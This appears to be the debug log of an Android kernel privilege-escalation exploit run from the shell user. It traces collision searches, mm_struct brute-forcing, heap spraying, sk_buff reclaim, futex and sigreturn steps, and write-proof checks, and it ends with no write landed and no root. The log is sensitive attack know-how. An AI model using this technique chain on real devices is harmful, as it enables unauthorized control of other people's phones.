===== preload.so crash-safe log =====
path=/storage/emulated/0/Download/.temp/log_1788950835.txt tmp=/data/local/tmp/.temp/log_1788950835.txt pid=14380 uid=2000
1788950836.084 14380 [+] preload starting pid=14380
1788950836.086 14380 [+] startup context pid=14380 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
1788950836.087 14380 [+] build config pid=14380 label=pd2238_os6_163150_w10 slide=pselect main=pselect
1788950836.092 14380 [+] p0 profile pid=14380 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 init_task=ffffffc00aaec240 root_tg=ffffffc00ad33100
1788950836.094 14380 [+] direct-map base=ffffff8040000000 slide=0000000000000000
1788950836.095 14380 [+] ckpt: WRITE-PROOF armed bootid_store=ffffff8042ee9110 bootid_buf=ffffff8042ee910d before=572969d4-57e7-49b4-8a9a-e53a242f9978 (odd: leaked scratch, even: aligned bootid+3)
1788950838.118 14380 [*] parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
1788950840.705 14380 [*] pile-up verified: approx_time=2398
1788950840.707 14380 [*] start finding collisisons
1788950840.709 14380 [*] target    000000793f0080c8
1788950858.817 14380 [*] [  7] tested 7300000 candidates, scanning=0xffffffb9975db480
1788950858.817 14380 [*] [  0] tested 7100000 candidates, scanning=0xffffff818c348f00
1788950858.818 14380 [*] [  4] tested 7000000 candidates, scanning=0xffffffa1869fff80
1788950858.818 14380 [*] [  6] tested 7200000 candidates, scanning=0xffffffb191c921c0
1788950858.820 14380 [*] [  5] tested 7600000 candidates, scanning=0xffffffa9a81b6cc0
1788950858.821 14380 [*] [  2] tested 7700000 candidates, scanning=0xffffff91adafff80
1788950858.821 14380 [*] [  1] tested 7400000 candidates, scanning=0xffffff899cf24740
1788950858.824 14380 [*] [  4] tested 7100000 candidates, scanning=0xffffffa18c348f00
1788950858.822 14380 [*] [  7] tested 7400000 candidates, scanning=0xffffffb99cf24740
1788950858.823 14380 [*] [  3] tested 7400000 candidates, scanning=0xffffff999cf24740
1788950858.823 14380 [*] [  0] tested 7200000 candidates, scanning=0xffffff8191c921c0
1788950858.824 14380 [*] [  6] tested 7300000 candidates, scanning=0xffffffb1975db480
1788950858.826 14380 [*] [  2] tested 7800000 candidates, scanning=0xffffff91b3448f00
1788950858.828 14380 [*] [  4] thread done, tested 7139251 candidates
1788950858.828 14380 [*] [  3] thread done, tested 7494343 candidates
1788950858.826 14380 [*] [  1] tested 7500000 candidates, scanning=0xffffff89a286da00
1788950858.829 14380 [*] [  1] thread done, tested 7500000 candidates
1788950858.827 14380 [*] [  7] tested 7500000 candidates, scanning=0xffffffb9a286da00
1788950858.827 14380 [*] [  5] tested 7700000 candidates, scanning=0xffffffa9adafff80
1788950858.828 14380 [*] [  6] thread done, tested 7300000 candidates
1788950858.828 14380 [*] [  0] thread done, tested 7259284 candidates
1788950858.828 14380 [*] [  2] thread done, tested 7800000 candidates
1788950858.830 14380 [*] [  7] thread done, tested 7500000 candidates
1788950858.830 14380 [*] [  5] thread done, tested 7700000 candidates
1788950858.833 14380 [*] prepare_kernel_page leaked_mm=ffffff8195180f00 base=ffffff8195180000 mode=0
1788950858.835 14380 [*] fake payload mode=0 write_shape=1 lock=ffffff81951804d0 w0=ffffff81951813a0 task=ffffff8195182380 write_parent=ffffff8195182178 write_right=ffffff8195180180 write_left=0000000000000000
1788950858.840 14380 [*] sk_buff reclaim send 1/4 ret=65536 errno=0
1788950858.841 14380 [*] sk_buff reclaim send 2/4 ret=65536 errno=0
1788950858.843 14380 [*] sk_buff reclaim send 3/4 ret=65536 errno=0
1788950858.845 14380 [*] sk_buff reclaim send 4/4 ret=65536 errno=0
1788950858.848 14380 [*] done
1788950863.794 14380 [+] heap_spray: page_base=ffffff8195180000 (leaked mm_struct)
1788950863.800 14380 [+] ckpt: route enter
1788950863.808 14380 [+] ckpt: route threads spawned
1788950863.811 14380 [+] ckpt: route ready waiter_waiting=1 owner_started=1
1788950863.912 14380 [+] ckpt: route CMP_REQUEUE_PI ret=-1 errno=35
1788950871.855 14380 [+] ckpt: waiter WAIT_REQUEUE_PI ret=-1 errno=110 tid=20016 sigalrm=0 setprio=0/0
1788950871.860 14380 [+] ckpt: do_sigret enter page=ffffff8195180000 lock=ffffff81951804d0 fops=ffffff8195180180
1788950871.862 14380 [+] ckpt: sigframe ready sf=0x79399fedb0 reserved=0x79399ff000 align16=1
1788950871.864 14380 [+] ckpt: sigret attempt=1 page=ffffff8195180000 lock=ffffff81951804d0 shape=1 tree_pc=ffffff8195182178 tree_right=ffffff8195180180 tree_left=0000000000000000 task=ffffff8195182380 (silent prctl then rt_sigreturn+hold)
1788950876.867 14380 [+] ckpt: sigret hold done attempt=1 prctl_ret=-1 prctl_errno=22 calls=1 walks=0 proof=scratch(leaked) target=ffffff8195182180
1788950876.867 14380 [+] ckpt: consumer walk seq=1 call=0 ret=0 errno=0 policy=0->3(want 3) nice=19 walked=1 armed=1/0 tid=20016
1788950876.872 14380 [+] ckpt: consumer seq=1 done calls=0 walked=1
1788950876.873 14380 [+] SCRATCH-DIAG total_recv=262144 diffs=0 write_value_landed=0 expect=ffffff8195180180
1788950876.875 14380 [+] ckpt: SCRATCH-WRITE-PROOF attempt=1 walks=0 target=ffffff8195182180 value=ffffff8195180180 landed=0
1788950878.236 14380 [*] parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
1788950879.768 14380 [*] pile-up verified: approx_time=151
1788950879.777 14380 [*] start finding collisisons
1788950879.789 14380 [*] target    000000793f0080c8
1788950881.020 14380 [*]   00000066a21edf68
1788950881.673 14380 [*]   00000066a28f3798
1788950881.925 14380 [*]   00000066a2a6c360
1788950883.304 14380 [*]   00000066a3c3e1f0
1788950884.034 14380 [*]   00000066a44b65b0
1788950884.909 14380 [*]   00000066a4ecd668
1788950885.753 14380 [*]   00000066a57b1d88
1788950887.083 14380 [*]   00000066a6650280
1788950888.469 14380 [*]   00000066a728b458
1788950888.851 14380 [*]   00000066a753f9f8
1788950889.783 14380 [*]   00000066a80371b8
1788950891.084 14380 [*]   00000066a8f96cb0
1788950891.748 14380 [*]   00000066a96b55a8
1788950892.950 14380 [*]   00000066aa575ba8
1788950894.115 14380 [*]   00000066ab3cfe78
1788950894.118 14380 [*] found 15 collisisons
1788950900.374 14380 [*] start bruteforcing
1788950900.379 14380 [*] [  0] start finding mm_struct [ffffff8000000000-ffffff8800000000]
1788950900.379 14380 [*] [  1] start finding mm_struct [ffffff8800000000-ffffff9000000000]
1788950900.379 14380 [*] [  2] start finding mm_struct [ffffff9000000000-ffffff9800000000]
1788950900.379 14380 [*] [  3] start finding mm_struct [ffffff9800000000-ffffffa000000000]
1788950900.379 14380 [*] [  4] start finding mm_struct [ffffffa000000000-ffffffa800000000]
1788950900.380 14380 [*] [  5] start finding mm_struct [ffffffa800000000-ffffffb000000000]
1788950900.380 14380 [*] [  6] start finding mm_struct [ffffffb000000000-ffffffb800000000]
1788950900.389 14380 [*] [  4] tested 100000 candidates, scanning=0xffffffa005948f00
1788950900.380 14380 [*] [  7] start finding mm_struct [ffffffb800000000-ffffffc000000000]
1788950900.383 14380 [*] [  0] tested 100000 candidates, scanning=0xffffff8005948f00
1788950900.383 14380 [*] [  1] tested 100000 candidates, scanning=0xffffff8805948f00
1788950900.384 14380 [*] [  3] tested 100000 candidates, scanning=0xffffff9805948f00
1788950900.391 14380 [*] [  2] tested 100000 candidates, scanning=0xffffff9005948f00
1788950900.393 14380 [*] [  6] tested 100000 candidates, scanning=0xffffffb005948f00
1788950900.393 14380 [*] [  4] tested 200000 candidates, scanning=0xffffffa00b2921c0
1788950900.391 14380 [*] [  5] tested 100000 candidates, scanning=0xffffffa805948f00
1788950900.394 14380 [*] [  7] tested 100000 candidates, scanning=0xffffffb805948f00
1788950900.394 14380 [*] [  0] tested 200000 candidates, scanning=0xffffff800b2921c0
1788950900.396 14380 [*] [  2] tested 200000 candidates, scanning=0xffffff900b2921c0
1788950900.397 14380 [*] [  6] tested 200000 candidates, scanning=0xffffffb00b2921c0
1788950900.398 14380 [*] [  4] tested 300000 candidates, scanning=0xffffffa010bdb480
1788950900.398 14380 [*] [  7] tested 200000 candidates, scanning=0xffffffb80b2921c0
1788950900.399 14380 [*] [  0] tested 300000 candidates, scanning=0xffffff8010bdb480
1788950900.400 14380 [*] [  2] tested 300000 candidates, scanning=0xffffff9010bdb480
1788950900.400 14380 [*] [  6] tested 300000 candidates, scanning=0xffffffb010bdb480
1788950900.401 14380 [*] [  1] tested 200000 candidates, scanning=0xffffff880b2921c0
1788950900.403 14380 [*] [  7] tested 300000 candidates, scanning=0xffffffb810bdb480
1788950900.404 14380 [*] [  0] tested 400000 candidates, scanning=0xffffff8016524740
1788950900.404 14380 [*] [  4] tested 400000 candidates, scanning=0xffffffa016524740
1788950900.405 14380 [*] [  2] tested 400000 candidates, scanning=0xffffff9016524740
1788950900.405 14380 [*] [  3] tested 200000 candidates, scanning=0xffffff980b2921c0
1788950900.406 14380 [*] [  6] tested 400000 candidates, scanning=0xffffffb016524740
1788950900.406 14380 [*] [  5] tested 200000 candidates, scanning=0xffffffa80b2921c0
1788950900.409 14380 [*] [  0] tested 500000 candidates, scanning=0xffffff801be6da00
1788950900.407 14380 [*] [  7] tested 400000 candidates, scanning=0xffffffb816524740
1788950900.409 14380 [*] [  2] tested 500000 candidates, scanning=0xffffff901be6da00
1788950900.410 14380 [*] [  6] tested 500000 candidates, scanning=0xffffffb01be6da00
1788950900.410 14380 [*] [  4] tested 500000 candidates, scanning=0xffffffa01be6da00
1788950900.410 14380 [*] [  1] tested 300000 candidates, scanning=0xffffff8810bdb480
1788950900.411 14380 [*] [  5] tested 300000 candidates, scanning=0xffffffa810bdb480
1788950900.413 14380 [*] [  7] tested 500000 candidates, scanning=0xffffffb81be6da00
1788950900.414 14380 [*] [  2] tested 600000 candidates, scanning=0xffffff90217b6cc0
1788950900.415 14380 [*] [  6] tested 600000 candidates, scanning=0xffffffb0217b6cc0
1788950900.416 14380 [*] [  5] tested 400000 candidates, scanning=0xffffffa816524740
1788950900.417 14380 [*] [  0] tested 600000 candidates, scanning=0xffffff80217b6cc0
1788950900.417 14380 [*] [  7] tested 600000 candidates, scanning=0xffffffb8217b6cc0
1788950900.419 14380 [*] [  6] tested 700000 candidates, scanning=0xffffffb0270fff80
1788950900.422 14380 [*] [  4] tested 600000 candidates, scanning=0xffffffa0217b6cc0
1788950900.422 14380 [*] [  5] tested 500000 candidates, scanning=0xffffffa81be6da00
1788950900.422 14380 [*] [  0] tested 700000 candidates, scanning=0xffffff80270fff80
1788950900.423 14380 [*] [  6] tested 800000 candidates, scanning=0xffffffb02ca48f00
1788950900.424 14380 [*] [  7] tested 700000 candidates, scanning=0xffffffb8270fff80
1788950900.425 14380 [*] [  2] tested 700000 candidates, scanning=0xffffff90270fff80
1788950900.425 14380 [*] [  4] tested 700000 candidates, scanning=0xffffffa0270fff80
1788950900.426 14380 [*] [  0] tested 800000 candidates, scanning=0xffffff802ca48f00
1788950900.428 14380 [*] [  2] tested 800000 candidates, scanning=0xffffff902ca48f00
1788950900.428 14380 [*] [  1] tested 400000 candidates, scanning=0xffffff8816524740
1788950900.425 14380 [*] [  3] tested 300000 candidates, scanning=0xffffff9810bdb480
1788950900.425 14380 [*] [  5] tested 600000 candidates, scanning=0xffffffa8217b6cc0
1788950900.428 14380 [*] [  4] tested 800000 candidates, scanning=0xffffffa02ca48f00
1788950900.429 14380 [*] [  0] tested 900000 candidates, scanning=0xffffff80323921c0
1788950900.430 14380 [*] [  7] tested 800000 candidates, scanning=0xffffffb82ca48f00
1788950900.431 14380 [*] [  2] tested 900000 candidates, scanning=0xffffff90323921c0
1788950900.432 14380 [*] [  1] tested 500000 candidates, scanning=0xffffff881be6da00
1788950900.432 14380 [*] [  3] tested 400000 candidates, scanning=0xffffff9816524740
1788950900.434 14380 [*] [  5] tested 700000 candidates, scanning=0xffffffa8270fff80
1788950900.435 14380 [*] [  4] tested 900000 candidates, scanning=0xffffffa0323921c0
1788950900.436 14380 [*] [  0] tested 1000000 candidates, scanning=0xffffff8037cdb480
1788950900.433 14380 [*] [  6] tested 900000 candidates, scanning=0xffffffb0323921c0
1788950900.437 14380 [*] [  2] tested 1000000 candidates, scanning=0xffffff9037cdb480
1788950900.440 14380 [*] [  7] tested 900000 candidates, scanning=0xffffffb8323921c0
1788950900.438 14380 [*] [  3] tested 500000 candidates, scanning=0xffffff981be6da00
1788950900.439 14380 [*] [  5] tested 800000 candidates, scanning=0xffffffa82ca48f00
1788950900.439 14380 [*] [  4] tested 1000000 candidates, scanning=0xffffffa037cdb480
1788950900.441 14380 [*] [  0] tested 1100000 candidates, scanning=0xffffff803d624740
1788950900.442 14380 [*] [  6] tested 1000000 candidates, scanning=0xffffffb037cdb480
1788950900.443 14380 [*] [  7] tested 1000000 candidates, scanning=0xffffffb837cdb480
1788950900.446 14380 [*] [  4] tested 1100000 candidates, scanning=0xffffffa03d624740
1788950900.445 14380 [*] [  1] tested 600000 candidates, scanning=0xffffff88217b6cc0
1788950900.445 14380 [*] [  2] tested 1100000 candidates, scanning=0xffffff903d624740
1788950900.446 14380 [*] [  5] tested 900000 candidates, scanning=0xffffffa8323921c0
1788950900.447 14380 [*] [  0] tested 1200000 candidates, scanning=0xffffff8042f6da00
1788950900.449 14380 [*] [  6] tested 1100000 candidates, scanning=0xffffffb03d624740
1788950900.450 14380 [*] [  4] tested 1200000 candidates, scanning=0xffffffa042f6da00
1788950900.450 14380 [*] [  7] tested 1100000 candidates, scanning=0xffffffb83d624740
1788950900.451 14380 [*] [  1] tested 700000 candidates, scanning=0xffffff88270fff80
1788950900.451 14380 [*] [  3] tested 600000 candidates, scanning=0xffffff98217b6cc0
1788950900.454 14380 [*] [  5] tested 1000000 candidates, scanning=0xffffffa837cdb480
1788950900.454 14380 [*] [  0] tested 1300000 candidates, scanning=0xffffff80488b6cc0
1788950900.454 14380 [*] [  6] tested 1200000 candidates, scanning=0xffffffb042f6da00
1788950900.455 14380 [*] [  4] tested 1300000 candidates, scanning=0xffffffa0488b6cc0
1788950900.457 14380 [*] [  5] tested 1100000 candidates, scanning=0xffffffa83d624740
1788950900.457 14380 [*] [  2] tested 1200000 candidates, scanning=0xffffff9042f6da00
1788950900.458 14380 [*] [  6] tested 1300000 candidates, scanning=0xffffffb0488b6cc0
1788950900.459 14380 [*] [  0] tested 1400000 candidates, scanning=0xffffff804e1fff80
1788950900.460 14380 [*] [  4] tested 1400000 candidates, scanning=0xffffffa04e1fff80
1788950900.460 14380 [*] [  3] tested 700000 candidates, scanning=0xffffff98270fff80
1788950900.461 14380 [*] [  5] tested 1200000 candidates, scanning=0xffffffa842f6da00
1788950900.462 14380 [*] [  0] thread done, tested 1454410 candidates
1788950900.462 14380 [*] [  4] thread done, tested 1400000 candidates
1788950900.462 14380 [*] [  1] thread done, tested 734409 candidates
1788950900.462 14380 [*] [  2] thread done, tested 1280642 candidates
1788950900.462 14380 [*] [  5] thread done, tested 1202617 candidates
1788950900.462 14380 [*] [  6] thread done, tested 1368281 candidates
1788950900.462 14380 [*] [  3] thread done, tested 715256 candidates
1788950900.462 14380 [*] [  7] thread done, tested 1147775 candidates
1788950900.465 14380 [*] prepare_kernel_page leaked_mm=ffffff8051294b00 base=ffffff8051290000 mode=0
1788950900.467 14380 [*] fake payload mode=0 write_shape=1 lock=ffffff80512904d0 w0=ffffff80512913a0 task=ffffff8051292380 write_parent=ffffff8042ee9108 write_right=ffffff8051290180 write_left=0000000000000000
1788950900.472 14380 [*] sk_buff reclaim send 1/4 ret=65536 errno=0
1788950900.473 14380 [*] sk_buff reclaim send 2/4 ret=65536 errno=0
1788950900.474 14380 [*] sk_buff reclaim send 3/4 ret=65536 errno=0
1788950900.474 14380 [*] sk_buff reclaim send 4/4 ret=65536 errno=0
1788950900.476 14380 [*] done
1788950904.343 14380 [+] ckpt: sigret attempt=2 page=ffffff8051290000 lock=ffffff80512904d0 shape=1 tree_pc=ffffff8042ee9108 tree_right=ffffff8051290180 tree_left=0000000000000000 task=ffffff8051292380 (silent prctl then rt_sigreturn+hold)
1788950909.350 14380 [+] ckpt: sigret hold done attempt=2 prctl_ret=-1 prctl_errno=22 calls=1 walks=0 proof=bootid(alias) target=ffffff8042ee9110
1788950909.350 14380 [+] ckpt: consumer walk seq=2 call=0 ret=0 errno=0 policy=3->0(want 0) nice=19 walked=1 armed=1/0 tid=20016
1788950909.355 14380 [+] ckpt: consumer seq=2 done calls=0 walked=1
1788950909.355 14380 [+] ckpt: BOOTID-WRITE-PROOF attempt=2 walks=0 before=572969d4-57e7-49b4-8a9a-e53a242f9978 after=572969d4-57e7-49b4-8a9a-e53a242f9978 walk_wrote=0
1788950909.356 14380 [+] ckpt: sigret route done (no write landed)
1788950909.363 14380 [+] ckpt: route done
1788950909.365 14380 [+] pipe-physrw-summary pid=14380 done=0 root=0 kaslr=1 base=ffffff8040000000 slide=0000000000000000
1788950909.368 14380 [+] pipe physrw pid=14380 done=0 root=0 kaslr=1 read_ok=0 write_ok=0 rw64=0/0 uid=4294967295->4294967295 sid=4294967295/4294967295->4294967295/4294967295 selinux=255->255 setgid=-1 setuid=-1 setenforce=-1/0
